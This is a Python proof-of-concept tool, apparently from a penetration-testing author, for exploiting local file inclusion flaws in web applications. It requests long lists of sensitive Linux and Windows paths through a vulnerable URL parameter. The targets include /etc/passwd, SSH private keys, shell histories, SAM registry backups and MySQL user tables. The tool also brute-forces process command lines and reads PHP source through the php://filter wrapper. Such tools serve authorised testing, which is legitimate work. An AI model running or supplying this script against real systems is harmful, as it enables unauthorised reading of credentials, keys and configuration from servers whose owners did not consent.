#!/usr/bin/python3

#################
# lfi enum poc  #
# by 0bfxgh0st* #
#################

import sys
import requests
import re

print ("lfienum ~by 0bfxgh0st*\n")

def Help():

	print ("Usage python3 lfienum.py <url>\n")
	print ("Options:\n")
	print ("       --pid          Bruteforce 999 process id")
	print ("       --wrapper      (php://filter/convert.base64-encode/resource=)\n")
	print ("Examples:")
	print ('           python3 lfienum.py "http://ghost.server/index.php?page="')
	print ('           python3 lfienum.py "http://ghost.server/index.php?page=" --pid')
	print ('           python3 lfienum.py "http://ghost.server/index.php?page=" --wrapper index.php')

headers = {
    'User-Agent': '--'
}

try:
	url = sys.argv[1]

except IndexError:

	Help()
	sys.exit(1)

linux_lfi_wordlist=['/etc/aliases',
'/etc/anacrontab',
'/etc/apache2/apache2.conf',
'/etc/apache2/httpd.conf',
'/etc/at.allow',
'/etc/at.deny',
'/etc/bashrc',
'/etc/bootptab',
'/etc/chrootUsers',
'/etc/chttp.conf',
'/etc/cron.allow',
'/etc/cron.deny',
'/etc/crontab',
'/etc/cups/cupsd.conf',
'/etc/exports',
'/etc/fstab',
'/etc/ftpaccess',
'/etc/ftpchroot',
'/etc/ftphosts',
'/etc/groups',
'/etc/grub.conf',
'/etc/hosts',
'/etc/hosts.allow',
'/etc/hosts.deny',
'/etc/httpd/access.conf',
'/etc/httpd/conf/httpd.conf',
'/etc/httpd/httpd.conf',
'/etc/httpd/logs/access_log',
'/etc/httpd/logs/access.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/etc/httpd/php.ini',
'/etc/httpd/srm.conf',
'/etc/inetd.conf',
'/etc/inittab',
'/etc/issue',
'/etc/lighttpd.conf',
'/etc/lilo.conf',
'/etc/logrotate.d/ftp',
'/etc/logrotate.d/proftpd',
'/etc/logrotate.d/vsftpd.log',
'/etc/lsb-release',
'/etc/motd',
'/etc/modules.conf',
'/etc/motd',
'/etc/mtab',
'/etc/my.cnf',
'/etc/my.conf',
'/etc/mysql/my.cnf',
'/etc/network/interfaces',
'/etc/networks',
'/etc/npasswd',
'/etc/passwd',
'/etc/php4.4/fcgi/php.ini',
'/etc/php4/apache2/php.ini',
'/etc/php4/apache/php.ini',
'/etc/php4/cgi/php.ini',
'/etc/php4/apache2/php.ini',
'/etc/php5/apache2/php.ini',
'/etc/php5/apache/php.ini',
'/etc/php/apache2/php.ini',
'/etc/php/apache/php.ini',
'/etc/php/cgi/php.ini',
'/etc/php.ini',
'/etc/php/php4/php.ini',
'/etc/php/php.ini',
'/etc/printcap',
'/etc/profile',
'/etc/proftp.conf',
'/etc/proftpd/proftpd.conf',
'/etc/pure-ftpd.conf',
'/etc/pureftpd.passwd',
'/etc/pureftpd.pdb',
'/etc/pure-ftpd/pure-ftpd.conf',
'/etc/pure-ftpd/pure-ftpd.pdb',
'/etc/pure-ftpd/putreftpd.pdb',
'/etc/redhat-release',
'/etc/resolv.conf',
'/etc/samba/smb.conf',
'/etc/snmpd.conf',
'/etc/ssh/ssh_config',
'/etc/ssh/sshd_config',
'/etc/ssh/ssh_host_dsa_key',
'/etc/ssh/ssh_host_dsa_key.pub',
'/etc/ssh/ssh_host_key',
'/etc/ssh/ssh_host_key.pub',
'/etc/sysconfig/network',
'/etc/syslog.conf',
'/etc/termcap',
'/etc/vhcs2/proftpd/proftpd.conf',
'/etc/vsftpd.chroot_list',
'/etc/vsftpd.conf',
'/etc/vsftpd/vsftpd.conf',
'/etc/wu-ftpd/ftpaccess',
'/etc/wu-ftpd/ftphosts',
'/etc/wu-ftpd/ftpusers',
'/logs/pure-ftpd.log',
'/logs/security_debug_log',
'/logs/security_log',
'/opt/lampp/etc/httpd.conf',
'/opt/xampp/etc/php.ini',
'/proc/cpuinfo',
'/proc/filesystems',
'/proc/interrupts',
'/proc/ioports',
'/proc/meminfo',
'/proc/modules',
'/proc/mounts',
'/proc/stat',
'/proc/swaps',
'/proc/version',
'/proc/self/net/arp',
'/root/anaconda-ks.cfg',
'/usr/etc/pure-ftpd.conf',
'/usr/lib/php.ini',
'/usr/lib/php/php.ini',
'/usr/local/apache/conf/modsec.conf',
'/usr/local/apache/conf/php.ini',
'/usr/local/apache/log',
'/usr/local/apache/logs',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/usr/local/apache/audit_log',
'/usr/local/apache/error_log',
'/usr/local/apache/error.log',
'/usr/local/cpanel/logs',
'/usr/local/cpanel/logs/access_log',
'/usr/local/cpanel/logs/error_log',
'/usr/local/cpanel/logs/license_log',
'/usr/local/cpanel/logs/login_log',
'/usr/local/cpanel/logs/stats_log',
'/usr/local/etc/httpd/logs/access_log',
'/usr/local/etc/httpd/logs/error_log',
'/usr/local/etc/php.ini',
'/usr/local/etc/pure-ftpd.conf',
'/usr/local/etc/pureftpd.pdb',
'/usr/local/lib/php.ini',
'/usr/local/php4/httpd.conf',
'/usr/local/php4/httpd.conf.php',
'/usr/local/php4/lib/php.ini',
'/usr/local/php5/httpd.conf',
'/usr/local/php5/httpd.conf.php',
'/usr/local/php5/lib/php.ini',
'/usr/local/php/httpd.conf',
'/usr/local/php/httpd.conf.ini',
'/usr/local/php/lib/php.ini',
'/usr/local/pureftpd/etc/pure-ftpd.conf',
'/usr/local/pureftpd/etc/pureftpd.pdn',
'/usr/local/pureftpd/sbin/pure-config.pl',
'/usr/local/www/logs/httpd_log',
'/usr/local/Zend/etc/php.ini',
'/usr/sbin/pure-config.pl',
'/var/adm/log/xferlog',
'/var/apache2/config.inc',
'/var/apache/logs/access_log',
'/var/apache/logs/error_log',
'/var/cpanel/cpanel.config',
'/var/lib/mysql/my.cnf',
'/var/lib/mysql/mysql/user.MYD',
'/var/local/www/conf/php.ini',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/apache2/error_log',
'/var/log/apache2/error.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/apache-ssl/access.log',
'/var/log/apache-ssl/error.log',
'/var/log/auth.log',
'/var/log/boot',
'/var/htmp',
'/var/log/chttp.log',
'/var/log/cups/error.log',
'/var/log/daemon.log',
'/var/log/debug',
'/var/log/dmesg',
'/var/log/dpkg.log',
'/var/log/exim_mainlog',
'/var/log/exim/mainlog',
'/var/log/exim_paniclog',
'/var/log/exim.paniclog',
'/var/log/exim_rejectlog',
'/var/log/exim/rejectlog',
'/var/log/faillog',
'/var/log/ftplog',
'/var/log/ftp-proxy',
'/var/log/ftp-proxy/ftp-proxy.log',
'/var/log/httpd/access_log',
'/var/log/httpd/access.log',
'/var/log/httpd/error_log',
'/var/log/httpd/error.log',
'/var/log/httpsd/ssl.access_log',
'/var/log/httpsd/ssl_log',
'/var/log/kern.log',
'/var/log/lastlog',
'/var/log/lighttpd/access.log',
'/var/log/lighttpd/error.log',
'/var/log/lighttpd/lighttpd.access.log',
'/var/log/lighttpd/lighttpd.error.log',
'/var/log/mail.info',
'/var/log/mail.log',
'/var/log/maillog',
'/var/log/mail.warn',
'/var/log/message',
'/var/log/messages',
'/var/log/mysqlderror.log',
'/var/log/mysql.log',
'/var/log/mysql/mysql-bin.log',
'/var/log/mysql/mysql.log',
'/var/log/mysql/mysql-slow.log',
'/var/log/proftpd',
'/var/log/pureftpd.log',
'/var/log/pure-ftpd/pure-ftpd.log',
'/var/log/secure',
'/var/log/vsftpd.log',
'/var/log/wtmp',
'/var/log/xferlog',
'/var/log/yum.log',
'/var/mysql.log',
'/var/run/utmp',
'/var/spool/cron/crontabs/root',
'/var/webmin/miniserv.log',
'/var/www/log/access_log',
'/var/www/log/error_log',
'/var/www/logs/access_log',
'/var/www/logs/error_log',
'/var/www/logs/access.log',
'/var/www/logs/error.log',
'~/.atfp_history',
'~/.bash_history',
'~/.bash_logout',
'~/.bash_profile',
'~/.bashrc',
'~/.gtkrc',
'~/.login',
'~/.logout',
'~/.mysql_history',
'~/.nano_history',
'~/.php_history',
'~/.profile',
'~/.ssh/authorized_keys',
'~/.ssh/id_dsa',
'~/.ssh/id_dsa.pub',
'~/.ssh/id_rsa',
'~/.ssh/id_rsa.pub',
'~/.ssh/identity',
'~/.ssh/identity.pub',
'~/.viminfo',
'~/.wm_style',
'~/.Xdefaults',
'~/.xinitrc',
'~/.Xresources',
'~/.xsession']

windows_lfi_wordlist=['C:/Users/Administrator/NTUser.dat',
'C:/Documents and Settings/Administrator/NTUser.dat',
'C:/apache/logs/access.log',
'C:/apache/logs/error.log',
'C:/apache/php/php.ini',
'C:/boot.ini',
'C:/inetpub/wwwroot/global.asa',
'C:/MySQL/data/hostname.err',
'C:/MySQL/data/mysql.err',
'C:/MySQL/data/mysql.log',
'C:/MySQL/my.cnf',
'C:/MySQL/my.ini',
'C:/php4/php.ini',
'C:/php5/php.ini',
'C:/php/php.ini',
'C:/Program Files/Apache Group/Apache2/conf/httpd.conf',
'C:/Program Files/Apache Group/Apache/conf/httpd.conf',
'C:/Program Files/Apache Group/Apache/logs/access.log',
'C:/Program Files/Apache Group/Apache/logs/error.log',
'C:/Program Files/FileZilla Server/FileZilla Server.xml',
'C:/Program Files/MySQL/data/hostname.err',
'C:/Program Files/MySQL/data/mysql-bin.log',
'C:/Program Files/MySQL/data/mysql.err',
'C:/Program Files/MySQL/data/mysql.log',
'C:/Program Files/MySQL/my.ini',
'C:/Program Files/MySQL/my.cnf',
'C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err',
'C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log ',
'C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err',
'C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log',
'C:/Program Files/MySQL/MySQL Server 5.0/my.cnf',
'C:/Program Files/MySQL/MySQL Server 5.0/my.ini',
'C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf',
'C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf',
'C:/Program Files (x86)/Apache Group/Apache/conf/access.log',
'C:/Program Files (x86)/Apache Group/Apache/conf/error.log',
'C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml',
'C:/Program Files (x86)/xampp/apache/conf/httpd.conf',
'C:/WINDOWS/php.ini',
'C:/WINDOWS/Repair/SAM',
'C:/Windows/repair/system',
'C:/Windows/repair/software',
'C:/Windows/repair/security',
'C:/WINDOWS/System32/drivers/etc/hosts',
'C:/Windows/win.ini',
'C:/WINNT/php.ini',
'C:/WINNT/win.ini',
'C:/xampp/apache/bin/php.ini',
'C:/xampp/apache/logs/access.log',
'C:/xampp/apache/logs/error.log',
'C:/Windows/Panther/Unattend/Unattended.xml',
'C:/Windows/Panther/Unattended.xml',
'C:/Windows/debug/NetSetup.log',
'C:/Windows/system32/config/AppEvent.Evt',
'C:/Windows/system32/config/SecEvent.Evt',
'C:/Windows/system32/config/default.sav',
'C:/Windows/system32/config/security.sav',
'C:/Windows/system32/config/software.sav',
'C:/Windows/system32/config/system.sav',
'C:/Windows/system32/config/regback/default',
'C:/Windows/system32/config/regback/sam',
'C:/Windows/system32/config/regback/security',
'C:/Windows/system32/config/regback/system',
'C:/Windows/system32/config/regback/software',
'C:/Program Files/MySQL/MySQL Server 5.1/my.ini',
'C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml',
'C:/Windows/System32/inetsrv/config/applicationHost.config',
'C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log',
'C:/Program Files/Microsoft SQL Server/MSSQL.1/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL10.SQLEXPRESS/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL11.SQLEXPRESS/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL12.SQLEXPRESS/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL13.SQLEXPRESS/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL14.SQLEXPRESS/Template Data/master.mdf']

def lfi_check_linux():
	# need accurate?
	# any false positive?
	if 'HW type' in clean_content or ':0:0:' in clean_content or '/bin/sh' in clean_content or 'apache' in clean_content or 'cron' in clean_content or 'fstab' in clean_content or 'localhost' in clean_content or 'hosts' in clean_content or '127.' in clean_content or 'GNU' in clean_content or 'Linux' in clean_content or 'kernel' in clean_content or '/dev/' in clean_content or 'mysql' in clean_content or 'dir' in clean_content or 'network' in clean_content or 'interface' in clean_content or '0.0.0.0' in clean_content or 'bash' in clean_content or 'nameserver' in clean_content or 'configuration' in clean_content or 'ssh' in clean_content or 'sshd' in clean_content or 'samba' in clean_content or 'cpu' in clean_content or 'core' in clean_content or 'sysfs' in clean_content or 'check' in clean_content or 'CPU' in clean_content or 'Bus' in clean_content or 'Active' in clean_content or 'Mapped' in clean_content or 'Live' in clean_content or 'config' in clean_content or 'version' in clean_content or 'Device' in clean_content or 'dpkg' in clean_content or 'startup' in clean_content or 'status' in clean_content or 'install' in clean_content or 'tty' in clean_content:
		# quick fix for google response junk data
		if '404.' and 'error' not in clean_content:
			print ("[\033[32m+\033[0m] [\033[32mLFI VULNERABLE\033[0m] " + url + possible_lfi_file)
			print (clean_content)

def lfi_check_windows():

	if 'This is a sample HOSTS file used by Microsoft' in clean_content or 'for 16-bit app' in clean_content or '[fonts]' in clean_content or '[pid' in clean_content or ':tid' in clean_content or ':notice' in clean_content or 'NetpDoDomainJoin' in clean_content or 'Netp' in clean_content or 'HTTP/1.1' in clean_content:
		print ("[\033[32m+\033[0m] [\033[32mLFI VULNERABLE\033[0m] " + url + possible_lfi_file)
		print (clean_content)


#################
## ARGS HANDLER #
#################
#
## only url parameter

if len(sys.argv) == 2:

	try:
     	   	## windows scan & enum
		for possible_lfi_file in windows_lfi_wordlist:
			resp = requests.get(url + possible_lfi_file, verify=True, headers=headers)
			content = resp.text
			clean_content = re.sub('<[^<]+?>', '', content)
			lfi_check_windows()
	except:

		sys.exit(1)

	try:
		## linux scan & enum
		for possible_lfi_file in linux_lfi_wordlist:
			resp = requests.get(url + possible_lfi_file, verify=True, headers=headers)
			content = resp.text
			clean_content = re.sub('<[^<]+?>', '', content)
			lfi_check_linux()

	except:

		sys.exit(1)


# url + pid args
try:
	if sys.argv[2] == "--pid":

		print ("Bruteforcing 0-999 PIDS (please ignore junk data)")
		pid_count=1000
		for pid in range(pid_count):
		        print ("PID " + str(pid))
	        	resp = requests.get(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers)
		        content = resp.text
		        clean_content = re.sub('<[^<]+?>', '', content)
        		print (clean_content.strip("\n"))

except IndexError:

	sys.exit(1)

# url + wrapper + wrapper file arg    ++ handling arg len errors
try:

	if sys.argv[2] == '--wrapper':

		resp = requests.get(url + 'php://filter/convert.base64-encode/resource=' + sys.argv[3], verify=True, headers=headers)
		content = resp.text
		clean_content = re.sub('<[^<]+?>', '', content)
		print (clean_content.strip("\n"))

except IndexError:

	print ("wrapper argument usage example:")
	print ("python3 lfienum.py http://ghost.server/index.php?page= --wrapper index.php")
	sys.exit(1)
